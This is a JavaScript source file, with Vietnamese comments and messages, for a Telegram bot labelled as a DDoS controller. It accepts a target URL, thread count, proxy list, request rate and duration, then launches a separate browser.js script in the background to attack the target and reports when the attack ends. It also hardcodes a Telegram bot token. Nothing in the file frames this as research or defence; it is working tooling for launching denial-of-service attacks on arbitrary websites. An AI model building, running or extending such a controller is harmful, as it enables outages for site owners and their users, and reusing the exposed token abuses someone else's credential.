// bot.js - DDOS CONTROLLER - TELEGRAF - ZERO ERROR
const { Telegraf } = require('telegraf');
const { spawn } = require('child_process');
const fs = require('fs');

// === CẤU HÌNH ===
const TOKEN = '7580314584:AAFLRinlnilclZpQgXt4fc5uKu2YSUwxH4k'; // ĐỔI TOKEN MỚI NGAY!
const DEFAULT_PROXY = 'proxy1.txt';
const bot = new Telegraf(TOKEN);

let isRunning = false;
let child = null;

// === /start ===
bot.start((ctx) => {
    ctx.replyWithMarkdown(`
*DDOS BOT CONTROLLER*

\`/d <url> <luồng> [proxy.txt] [rate] <giây>\`

*Ví dụ:*
\`/d https://example.com 10 60\`
\`/d https://example.com 20 proxy2.txt 200 120\`

\`/stop\` → Dừng
Proxy mặc định: \`${DEFAULT_PROXY}\``
    );
});

// === /d → GỌI browser.js ===
bot.command('d', (ctx) => {
    if (isRunning) return ctx.reply('Đang chạy! Dùng /stop trước.');

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 3) return ctx.replyWithMarkdown('Sai! Ví dụ: `/d https://example.com 10 60`');

    let [url, threads, ...rest] = args;
    let time = rest.pop();
    let proxy = DEFAULT_PROXY;
    let rate = '100';

    rest.forEach(a => {
        if (a.endsWith('.txt') && fs.existsSync(a)) proxy = a;
        else if (/^\d+$/.test(a)) rate = a;
    });

    // Validate
    if (!url.match(/^https?:\/\//)) return ctx.reply('URL phải có http:// hoặc https://');
    if (isNaN(threads) || threads < 1 || threads > 50) return ctx.reply('Luồng: 1-50');
    if (isNaN(time) || time < 10) return ctx.reply('Thời gian ≥ 10 giây');
    if (isNaN(rate) || rate < 1 || rate > 1000) return ctx.reply('Rate: 1-1000');
    if (!fs.existsSync(proxy)) return ctx.reply(`Không thấy file: ${proxy}`);

    // === CHẠY browser.js ===
    ctx.replyWithMarkdown(`
*Khởi chạy...*
URL: \`${url}\`
Luồng: \`${threads}\`
Proxy: \`${proxy}\`
Rate: \`${rate}\`
Thời gian: \`${time}s\`
    `);

    const params = [url, threads, proxy, rate, time];
    child = spawn('node', ['browser.js', ...params], { detached: true, stdio: 'ignore' });
    child.unref();
    isRunning = true;

    console.log(`[RUN] node browser.js ${params.join(' ')}`);

    // Báo kết thúc
    setTimeout(() => {
        if (isRunning) {
            ctx.reply('*Tấn công kết thúc.*');
            isRunning = false;
        }
    }, (parseInt(time) + 10) * 1000);
});

// === /stop ===
bot.command('stop', (ctx) => {
    if (!isRunning) return ctx.reply('Không có gì đang chạy.');

    require('child_process').exec('pkill -f "node browser.js" || taskkill /f /im node.exe 2>nul');
    require('child_process').exec('pkill -f chrome || taskkill /f /im msedge.exe 2>nul');

    isRunning = false;
    child = null;
    ctx.reply('*ĐÃ DỪNG TẤT CẢ!*');
    console.log('[STOP] Đã kill tất cả');
});

// === KHỞI ĐỘNG ===
bot.launch();
console.log('Bot đang chạy... Gửi /start');